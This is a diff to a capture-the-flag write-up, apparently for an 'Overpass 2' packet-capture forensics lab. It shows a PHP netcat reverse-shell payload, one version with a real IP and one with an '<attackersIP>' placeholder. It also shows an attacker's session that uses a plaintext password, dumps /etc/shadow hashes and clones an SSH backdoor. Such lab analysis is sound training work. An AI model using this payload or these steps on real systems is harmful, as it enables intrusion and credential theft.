@@ -132,7 +132,7 @@ Answer Q1: /development/
 From the same POST packet the easiest way to view it is via follow TCP or HTTP stream.
 Answer Q2: 
 ```
-<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
+<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attackersIP> 4242 >/tmp/f")?>
 ```
 or can be found in the hypertext section but its broken into a series of very short lines.
 
@@ -155,7 +155,6 @@ Note the sudo -l in the follow list from this search shows the user james seems 
 /bin/sh: 0: can't access tty; job control turned off
 
 $ id
-
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 $ python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -165,26 +164,18 @@ www-data@overpass-production:/var/www/html/development/uploads$ ls -lAh
 total 8.0K
 -rw-r--r-- 1 www-data www-data 51 Jul 21 17:48 .overpass
 -rw-r--r-- 1 www-data www-data 99 Jul 21 20:34 payload.php
-www-data@overpass-production:/var/www/html/development/uploads$ 
 
-cat .overpass
-
+www-data@overpass-production:/var/www/html/development/uploads$ cat .overpass
 ,LQ?2>6QiQ$JDE6>Q[QA2DDQiQH96?6G6C?@E62CE:?DE2?EQN.
 
 www-data@overpass-production:/var/www/html/development/uploads$ su james
 
-Password: 
-whenevernoteartinstant
-
+Password: whenevernoteartinstant
 
 james@overpass-production:/var/www/html/development/uploads$ cd ~
 
-james@overpass-production:~$ 
-sudo -l
-
-[sudo] password for james: 
-whenevernoteartinstant
-
+james@overpass-production:~$ sudo -l
+[sudo] password for james: whenevernoteartinstant
 
 Matching Defaults entries for james on overpass-production:
     env_reset, mail_badpass,
@@ -194,18 +185,14 @@ User james may run the following commands on overpass-production:
     (ALL : ALL) ALL
 
 james@overpass-production:~$ sudo cat /etc/shadow
-
-sudo cat /etc/shadow
 ...
 james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
 paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
 szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
 bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
 muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::
-james@overpass-production:~$ 
-git clone https://github.com/NinjaJc01/ssh-backdoor
 
-
+james@overpass-production:~$ git clone https://github.com/NinjaJc01/ssh-backdoor
 <git clone https://github.com/NinjaJc01/ssh-backdoor
 Cloning into 'ssh-backdoor'...
 remote: Enumerating objects: 18, done.        
